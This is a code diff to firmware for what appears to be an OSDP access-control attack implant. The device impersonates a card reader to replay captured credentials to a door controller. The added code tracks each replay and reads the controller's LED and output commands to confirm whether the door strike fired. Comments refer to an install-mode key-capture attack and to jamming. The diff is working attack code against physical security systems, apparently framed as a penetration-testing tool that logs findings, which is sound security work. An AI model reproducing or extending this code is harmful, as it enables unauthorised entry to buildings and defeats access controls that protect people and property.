@@ -158,6 +158,22 @@ static char scbk_hex[CONFIG_PASSWORD_LENGTH] = {0};
 static uint8_t scbk_raw[16];
 
 static HardwareSerial *osdp_serial = NULL;
+// Replay demonstration state.
+//
+// After presenting a captured credential to the controller, the controller's
+// own reply is the evidence. A controller that accepts a credential tells the
+// reader to say so - green LED, a tone - and fires the door strike through an
+// output command. Those arrive here as ordinary OSDP commands, so the outcome
+// of a replay is directly observable rather than inferred.
+static unsigned long replay_at_ms = 0;
+static char replay_hex[TICK_TX_MAX_CHARS + 1] = {0};
+static unsigned long replay_bits = 0;
+static bool replay_awaiting_verdict = false;
+
+// How long after a replay a reader-feedback command still counts as a
+// response to it. Controllers answer within a poll cycle or two.
+static const unsigned long REPLAY_VERDICT_WINDOW_MS = 3000;
+
 static bool pd_ready = false;
 static bool cp_ready = false;
 static bool jamming = false;
@@ -208,9 +224,80 @@ int osdp_serial_recv_func(void *data, uint8_t *buf, int len) {
   return osdp_serial->read(buf, (size_t)len);
 }
 
+static const char *led_colour_name(uint8_t colour) {
+  switch (colour) {
+    case 1: return "red";
+    case 2: return "green";
+    case 3: return "amber";
+    case 4: return "blue";
+    case 5: return "magenta";
+    case 6: return "cyan";
+    case 7: return "white";
+    default: return "off";
+  }
+}
+
+// Interpret a reader-feedback command that arrived just after a replay.
+//
+// Deliberately reports what the controller actually did rather than a verdict
+// of its own where the signal is ambiguous: a red LED is a refusal, an
+// energised output is the door strike, and a bare tone could be either.
+static void note_replay_response(struct osdp_cmd *cmd) {
+  if (!replay_awaiting_verdict) return;
+  if ((unsigned long)(millis() - replay_at_ms) > REPLAY_VERDICT_WINDOW_MS) {
+    replay_awaiting_verdict = false;
+    return;
+  }
+
+  char detail[TICK_FINDING_DETAIL_LEN];
+
+  if (cmd->id == OSDP_CMD_OUTPUT) {
+    // Control codes 2, 4 and 5 energise the output. On an access control
+    // panel that output is the door strike.
+    bool energised = cmd->output.control_code == 2 ||
+                     cmd->output.control_code == 4 ||
+                     cmd->output.control_code == 5;
+    if (!energised) return;
+
+    snprintf(detail, sizeof(detail), "%s:%lu -> output %u energised",
+             replay_hex, replay_bits, (unsigned)cmd->output.output_no);
+    tick_record_finding("credential_replay_accepted", detail,
+                        TICK_SEVERITY_CRITICAL, true, (uint8_t)address);
+    append_log("osdp", String("replay accepted, door output fired: ") + detail);
+    replay_awaiting_verdict = false;
+    return;
+  }
+
+  if (cmd->id == OSDP_CMD_LED) {
+    uint8_t colour = cmd->led.temporary.on_color;
+    if (colour == 0) colour = cmd->led.permanent.on_color;
+
+    if (colour == 2 || colour == 6 || colour == 7) {  // green, cyan, white
+      snprintf(detail, sizeof(detail), "%s:%lu -> reader LED %s",
+               replay_hex, replay_bits, led_colour_name(colour));
+      tick_record_finding("credential_replay_accepted", detail,
+                          TICK_SEVERITY_CRITICAL, true, (uint8_t)address);
+      append_log("osdp", String("replay accepted: ") + detail);
+      replay_awaiting_verdict = false;
+    } else if (colour == 1 || colour == 3) {  // red, amber
+      snprintf(detail, sizeof(detail), "%s:%lu -> reader LED %s",
+               replay_hex, replay_bits, led_colour_name(colour));
+      // Still worth recording: the credential reached the controller and was
+      // processed. It says the injection path works even though this
+      // particular card was refused.
+      tick_record_finding("credential_replay_rejected", detail,
+                          TICK_SEVERITY_MEDIUM, true, (uint8_t)address);
+      append_log("osdp", String("replay rejected: ") + detail);
+      replay_awaiting_verdict = false;
+    }
+  }
+}
+
 int osdp_pd_event_handler(void *data, struct osdp_cmd *cmd) {
   (void)(data);
   if (cmd == NULL) return -1;
+
+  note_replay_response(cmd);
 
   if (cmd->id == OSDP_CMD_KEYSET) {
     // This is the install mode attack landing.
@@ -478,7 +565,19 @@ static void osdp_pd_tx(const char *hex, size_t hex_len, unsigned long bits) {
   }
   card_event.cardread.length = (int)(bits > max_bits ? max_bits : bits);
 
-  pd.submit_event(&card_event);
+  if (pd.submit_event(&card_event) == 0) {
+    // Remember what was presented so the controller's reaction can be tied
+    // back to it.
+    size_t copy = hex_len < TICK_TX_MAX_CHARS ? hex_len : TICK_TX_MAX_CHARS;
+    memcpy(replay_hex, hex, copy);
+    replay_hex[copy] = '\0';
+    replay_bits = (unsigned long)card_event.cardread.length;
+    replay_at_ms = millis();
+    replay_awaiting_verdict = true;
+
+    append_log("osdp", String("replayed credential ") + replay_hex + ":" +
+                           String(replay_bits));
+  }
 }
 
 const tick_protocol tick_protocol_osdp_pd = {
